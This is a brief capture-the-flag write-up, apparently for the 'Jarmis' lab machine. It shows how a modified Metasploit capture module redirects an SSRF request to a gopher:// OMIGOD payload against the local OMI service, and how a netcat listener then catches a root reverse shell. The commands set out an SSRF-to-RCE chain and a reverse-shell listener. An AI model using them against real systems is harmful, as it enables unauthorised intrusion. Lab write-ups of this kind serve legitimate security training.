# Alternative way to exploit Jarmis

## Redirecting with Metasploit

Instead of creating firewall rules with `iptables` and starting several listeners manually, it is possible to use **Metasploit** to start a web server that automatically redirects.

Copying _http_basic.rb_ module to _http_forward.rb_:
```
cp /usr/share/metasploit-framework/modules/auxiliary/server/capture/http_basic.rb ~/.msf4/modules/auxiliary/server/capture/http_forward.rb
```

The modified code can be found in this repository in [jarmis_metasploit-http-forward.rb](jarmis/jarmis_metasploit-http-forward.rb).

Starting the web server with **Metasploit**:
```
msf6 > use auxiliary/server/capture/http_forward

msf6 auxiliary(server/capture/http_forward) > set SRVPORT 443
msf6 auxiliary(server/capture/http_forward) > set SRVHOST tun0
msf6 auxiliary(server/capture/http_forward) > set RedirectURL 'gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20(...)

msf6 auxiliary(server/capture/http_forward) > run
```

Starting the listener:
```
nc -lvnp 9001
```

Sending the request to the web server on the listener on port 443:
```
curl -s -X 'GET' 'http://10.10.11.117/api/v1/fetch?endpoint=https://10.10.14.3:443/mPqqNG1oZBWg' -H 'accept: application/json' | jq
```

After sending the request, it will be directly redirected to the OMI service with the **OMIGOD** payload and the listener on port 9001 starts a reverse shell as root!
